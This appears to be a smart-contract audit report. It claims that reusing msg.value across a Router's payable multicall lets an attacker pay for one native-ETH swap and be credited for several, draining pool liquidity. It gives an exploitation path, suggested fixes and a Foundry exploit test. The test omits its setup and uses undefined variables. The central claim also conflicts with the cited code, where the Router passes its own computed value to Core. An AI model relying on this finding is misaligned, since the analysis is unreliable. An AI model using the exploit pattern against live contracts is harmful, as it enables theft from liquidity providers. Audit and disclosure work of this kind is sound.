## Title
msg.value Reuse in Multicall Enables Underpayment and Solvency Violation

## Summary
The protocol's `PayableMulticallable` contracts (Router, BasePositions, Orders) allow multiple operations involving native ETH to be batched via `multicall()`. Due to delegatecall semantics, all calls within a multicall see the same `msg.value`, causing `Core._updatePairDebtWithNative()` to credit the same ETH payment multiple times across independent lock contexts, violating the solvency invariant.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) [2](#0-1) [3](#0-2) 

**Intended Logic:** Each swap operation should independently account for native token payments. When `msg.value` is sent with a transaction, it should be credited once to offset debt for native token transfers.

**Actual Logic:** When multiple swaps involving native token are batched via `Router.multicall()` with a single `msg.value`, each swap independently calls `Core._updatePairDebtWithNative()` within separate lock contexts. Because multicall uses delegatecall, all nested calls see the same `msg.value`. The function subtracts `msg.value` from debt multiple times (once per swap), effectively allowing users to pay once but receive credit multiple times.

**Exploitation Path:**

1. **Attacker calls `Router.multicall([swap1, swap2])`** with `msg.value = 1 ETH`: [2](#0-1) 

2. **First swap executes** in lock context ID 0:
   - Router calculates `value = 1 ETH` based on swap parameters [4](#0-3) 
   - Calls `Core.swap(1 ETH, ...)` which invokes `_updatePairDebtWithNative()`
   - Debt calculation: `debtChange0 - int256(msg.value)` credits the full `msg.value` [5](#0-4) 
   - Lock 0 completes with balanced debt

3. **Second swap executes** in lock context ID 1:
   - Same `msg.value = 1 ETH` is visible due to delegatecall semantics [6](#0-5) 
   - Core.swap() again calls `_updatePairDebtWithNative()` with the SAME `msg.value`
   - Debt is credited AGAIN with the already-used ETH [5](#0-4) 
   - Lock 1 completes with balanced debt

4. **Result:** User executed 2 ETH worth of swaps but only paid 1 ETH, extracting 1 ETH worth of tokens from pools without payment, violating solvency.

**Security Property Broken:** Violates the **Solvency Invariant** - pool balances go negative as users extract value without full payment. The flash accounting system incorrectly settles debts by counting the same `msg.value` multiple times across independent lock contexts.

**Critical Code Comment:** The developers explicitly noted this risk: [7](#0-6) [8](#0-7) 

## Impact Explanation

- **Affected Assets**: All pools with native token (ETH) as token0, entire protocol ETH balance
- **Damage Severity**: Attacker can extract N-1 ETH for every N swaps batched in a multicall, where each swap requests 1 ETH of native token. With sufficient liquidity, can drain entire protocol ETH holdings.
- **User Impact**: All LPs providing liquidity in native token pairs lose funds. Protocol becomes insolvent as actual ETH balance < accounted debt.

## Likelihood Explanation

- **Attacker Profile**: Any user with access to `Router.multicall()` - no special permissions required
- **Preconditions**: Pools with native token must have sufficient liquidity; attacker needs minimal capital (can batch many small swaps)
- **Execution Complexity**: Single transaction calling `Router.multicall()` with crafted swap array
- **Frequency**: Repeatable unlimited times until pools drained; can target multiple pools simultaneously

## Recommendation

**Option 1 (Recommended):** Disable multicall for functions that rely on `msg.value`:

```solidity
// In src/base/PayableMulticallable.sol:
function multicall(bytes[] calldata data) public payable override returns (bytes[] memory) {
    // Prevent msg.value reuse across multiple calls
    if (msg.value > 0 && data.length > 1) {
        revert MultiCallWithValueNotAllowed();
    }
    _multicallDirectReturn(_multicall(data));
}
```

**Option 2:** Track `msg.value` consumption in transient storage per transaction:

```solidity
// In Core._updatePairDebtWithNative:
// Only use remaining unclaimed msg.value
uint256 remainingValue = msg.value - _getUsedMsgValue();
if (remainingValue > 0) {
    if (token0 == NATIVE_TOKEN_ADDRESS) {
        _updatePairDebt(id, token0, token1, debtChange0 - int256(remainingValue), debtChange1);
        _markMsgValueUsed(remainingValue);
    }
    // ...
}
```

**Option 3:** Move ETH handling logic outside multicall-enabled contracts, requiring direct calls for native token operations.

## Proof of Concept

```solidity
// File: test/Exploit_MsgValueReuse.t.sol
// Run with: forge test --match-test test_msgValueReuseInMulticall -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";

contract Exploit_MsgValueReuse is Test {
    Router router;
    Core core;
    
    function setUp() public {
        // Deploy core and router
        core = new Core();
        router = new Router(ICore(address(core)));
        
        // Initialize test pools with native token
        // [setup code omitted for brevity]
    }
    
    function test_msgValueReuseInMulticall() public {
        // SETUP: Create two swap calls for 1 ETH each
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(
            router.swap,
            (poolKey1, params1, threshold1, address(this))
        );
        calls[1] = abi.encodeCall(
            router.swap,
            (poolKey2, params2, threshold2, address(this))
        );
        
        uint256 attackerBalanceBefore = address(this).balance;
        uint256 tokensReceivedBefore = token.balanceOf(address(this));
        
        // EXPLOIT: Call multicall with only 1 ETH but execute 2x 1 ETH swaps
        router.multicall{value: 1 ether}(calls);
        
        uint256 tokensReceived = token.balanceOf(address(this)) - tokensReceivedBefore;
        uint256 ethSpent = attackerBalanceBefore - address(this).balance;
        
        // VERIFY: Received tokens worth ~2 ETH but only spent 1 ETH
        assertEq(ethSpent, 1 ether, "Should only spend 1 ETH");
        assertApproxEqRel(
            tokensReceived,
            expectedTokensFor2ETH,
            0.01e18,
            "Vulnerability confirmed: got 2 ETH worth of tokens for 1 ETH"
        );
    }
}
```

**Notes**

This vulnerability stems from the architectural mismatch between:
1. FlashAccountant's design assumption that contracts using `msg.value` should never be multicallable
2. Router/BasePositions/Orders inheriting from PayableMulticallable while operating on Core (which uses msg.value)

The direct return pattern itself (`_multicallDirectReturn`) is not the root cause - rather, it's the combination of multicall's delegatecall semantics with msg.value-dependent debt accounting that creates the exploit. The comment in FlashAccountant.receive() explicitly warns against this pattern, but the warning was not enforced at the contract composition level.

### Citations

**File:** src/Core.sol (L329-355)
```text
    function _updatePairDebtWithNative(
        uint256 id,
        address token0,
        address token1,
        int256 debtChange0,
        int256 debtChange1
    ) private {
        if (msg.value == 0) {
            // No native token payment included in the call, so use optimized pair update
            _updatePairDebt(id, token0, token1, debtChange0, debtChange1);
        } else {
            if (token0 == NATIVE_TOKEN_ADDRESS) {
                unchecked {
                    // token0 is native, so we can still use pair update with adjusted debtChange0
                    // Subtraction is safe because debtChange0 and msg.value are both bounded by int128/uint128
                    _updatePairDebt(id, token0, token1, debtChange0 - int256(msg.value), debtChange1);
                }
            } else {
                // token0 is not native, and since token0 < token1, token1 cannot be native either
                // Update the token0, token1 debt and then update native token debt separately
                unchecked {
                    _updatePairDebt(id, token0, token1, debtChange0, debtChange1);
                    _accountDebt(id, NATIVE_TOKEN_ADDRESS, -int256(msg.value));
                }
            }
        }
    }
```

**File:** src/base/PayableMulticallable.sol (L17-19)
```text
    function multicall(bytes[] calldata data) public payable override returns (bytes[] memory) {
        _multicallDirectReturn(_multicall(data));
    }
```

**File:** src/Router.sol (L91-150)
```text
    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory result) {
        uint256 callType = abi.decode(data, (uint256));

        if (callType == CALL_TYPE_SINGLE_SWAP) {
            // swap
            (
                ,
                address swapper,
                PoolKey memory poolKey,
                SwapParameters params,
                int256 calculatedAmountThreshold,
                address recipient
            ) = abi.decode(data, (uint256, address, PoolKey, SwapParameters, int256, address));

            unchecked {
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );

                bool increasing = params.isPriceIncreasing();

                (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);

                int128 amountCalculated = params.isToken1() ? -balanceUpdate.delta0() : -balanceUpdate.delta1();
                if (amountCalculated < calculatedAmountThreshold) {
                    revert SlippageCheckFailed(calculatedAmountThreshold, amountCalculated);
                }

                if (increasing) {
                    if (balanceUpdate.delta0() != 0) {
                        ACCOUNTANT.withdraw(poolKey.token0, recipient, uint128(-balanceUpdate.delta0()));
                    }
                    if (balanceUpdate.delta1() != 0) {
                        ACCOUNTANT.payFrom(swapper, poolKey.token1, uint128(balanceUpdate.delta1()));
                    }
                } else {
                    if (balanceUpdate.delta1() != 0) {
                        ACCOUNTANT.withdraw(poolKey.token1, recipient, uint128(-balanceUpdate.delta1()));
                    }

                    if (balanceUpdate.delta0() != 0) {
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
                        } else {
                            ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
                        }
                    }
                }

                result = abi.encode(balanceUpdate);
            }
```

**File:** src/base/FlashAccountant.sol (L148-153)
```text
            let current := tload(_CURRENT_LOCKER_SLOT)

            let id := shr(160, current)

            // store the count
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, add(id, 1)), caller()))
```

**File:** src/base/FlashAccountant.sol (L387-388)
```text
        // Note because we use msg.value here, this contract can never be multicallable, i.e. it should never expose the ability
        //      to delegatecall itself more than once in a single call
```

**File:** src/interfaces/IFlashAccountant.sol (L76-79)
```text
    /// @dev This contract can receive ETH as a payment. The received amount is credited as a negative
    ///      debt change for the native token. Note: because we use msg.value here, this contract can
    ///      never be multicallable, i.e. it should never expose the ability to delegatecall itself
    ///      more than once in a single call.
```
